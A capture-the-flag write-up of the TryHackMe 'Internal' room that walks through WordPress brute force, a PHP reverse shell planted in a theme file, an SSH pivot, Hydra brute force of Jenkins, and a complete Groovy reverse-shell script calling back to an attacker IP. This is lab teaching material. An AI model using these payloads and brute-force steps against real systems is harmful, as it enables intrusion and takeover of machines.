# THM - Internal

#### Ip: 10.10.32.84
#### Name: Internal
#### Rating: Hard

----------------------------------------------------------------------

internal.jpeg

### Pre-Engagement Briefing

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks. 

Scope of Work

The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

    User.txt
    Root.txt

Additionally, the client has provided the following scope allowances:

    Ensure that you modify your hosts file to reflect internal.thm
    Any tools or techniques are permitted in this engagement
    Locate and note all vulnerabilities found
    Submit the flags discovered to the dashboard
    Only the IP address assigned to your machine is in scope

### Enumeration

As always, lets kick things off by scanning all TCP ports with Nmap. Here I will also use the `--min-rate 10000` flag to speed the scan up.

```text
┌──(ryan㉿kali)-[~/THM/Internal]
└─$ sudo nmap -p-  --min-rate 10000 10.10.32.84 
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-07 09:45 CDT
Nmap scan report for 10.10.32.84
Host is up (0.13s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.23 seconds
```

Looks like just the classic ports 22 and 80 open. Lets enumerate a bit deeper by also using the `-sC` and `-sV` flags for basic scripts and versions. 

```text
┌──(ryan㉿kali)-[~/THM/Internal]
└─$ sudo nmap -sC -sV -T4 10.10.32.84 -p 22,80
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-07 09:45 CDT
Nmap scan report for 10.10.32.84
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6efaefbef65f98b9597bf78eb9c5621e (RSA)
|   256 ed64ed33e5c93058ba23040d14eb30e9 (ECDSA)
|_  256 b07f7f7b5262622a60d43d36fa89eeff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.03 seconds
```

Navigating to the the website on port 80 we find a default Apache landing page.

it_works.png

Per the pre-engagement briefing I'll aslo add internal.thm to my `/etc/hosts` file. 

Using Feroxbuster to search for subdirectories yields some interesting results:

directories.png

Navigating to http://internal.thm/blog/ we find a WordPress site. 

blog.png

Looking at the Hello World! post, we find a username of Admin. Lets use the WPScan tool to try and brute force the admin user's password:

```text
wpscan --url http://internal.thm/blog/wp-login.php --usernames admin --passwords /usr/share/wordlists/rockyou.txt
```

Nice! wpscan found a valid credential.

pw.png

admin:my2boys

We can now login to the administrator dashboard.

admin_dash.php

### Exploitation

With admin access like this, getting a shell on the machine should be easy.

Lets grab a copy of php-reverse-shell.php from PentestMonkey and update the code with our IP and the port we'll have a NetCat listener on.

php.png

Once this is updated we can go to Appearance > Theme Editor and click into the 404 Template page. I'll go ahead and delete the code and replace it with the php-reverse-shell code we updated. 

Once this is saved we can set up a netcat listener and navigate to: http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php

and catch a shell back as www-data.

shell.png

and stabilize the shell using Python `python3 -c 'import pty;pty.spawn("bash")'`

Once the shell is stabilized, I tried to grab ther user.txt flag in aubreanna's home directory, but got a permission denied. Looks like I'll need to escalate my privileges first. 

denied.png

Checking out the machine a bit more I find an interesting file in the `/opt` directory.

```text
www-data@internal:/opt$ ls
containerd  wp-save.txt
www-data@internal:/opt$ cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

Great! I can now use `su aubreanna` enter the password and grab the first flag.

user_flag.png

### Privilege Escalation

Also of interest in the directory was a jenkins.txt note:

`Internal Jenkins service is running on 172.17.0.2:8080`

Ok interesting, it seems we must be in a Docker container. To access this internal IP we'll need to set up an SSH tunnel. To do this I'll use sshuttle:

```text
┌──(ryan㉿kali)-[~/THM/Internal]
└─$ sudo sshuttle -r aubreanna@internal.thm 172.17.0.2
The authenticity of host 'internal.thm (10.10.32.84)' can't be established.
ED25519 key fingerprint is SHA256:seRYczfyDrkweytt6CJT/aBCJZMIcvlYYrTgoGxeHs4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'internal.thm' (ED25519) to the list of known hosts.
aubreanna@internal.thm's password: 
c : Connected to server.
```

We can now navigate to the Jenkins page on port 8080:

jenkins.png

None of the passwords we've discovered so far are working here, so looks like its back to bruteforcing this login page. We can do that with Hydra. 

Before kicking off the brutefotce attack, lets capture an attempted logon in Burp to see how its behaving:

burp.png

Interesting, it appears an attempted logon is sending a POST request to `/j_acegi_security_check` and the username and password fields are titled `j_username` and `j_password` respectively. 

We'll need to include that in our Hydra command. 

Nice! We were able to brute force the admin's password:

hydra.png

Once logged in we can navigate to http://172.17.0.2:8080/script/ 

script_page.png

After setting up a netcat listener, inside the script console we can run:

```text
String host="10.6.61.45";
int port=8000;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())
{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());
while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try
{p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

And catch a shell back as user Jenkins.

```text
┌──(ryan㉿kali)-[~/THM/Internal]
└─$ nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.6.61.45] from (UNKNOWN) [10.10.32.84] 33800
whoami
jenkins
hostname
jenkins
```

After stabilizing the shell and poking around a bit I found yet another interesting file in the `/opt` directory:

```text
jenkins@jenkins:/opt$ cat note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

Cool, armed with these credentials I can SSH in as the root user:

```text
┌──(ryan㉿kali)-[~/THM/Internal]
└─$ ssh root@10.10.32.84  
root@10.10.32.84's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)
```

And grab the final flag:

root_flag.png

That's all she wrote! Thanks for following along!

-Ryan

--------------------------------------------------------------------------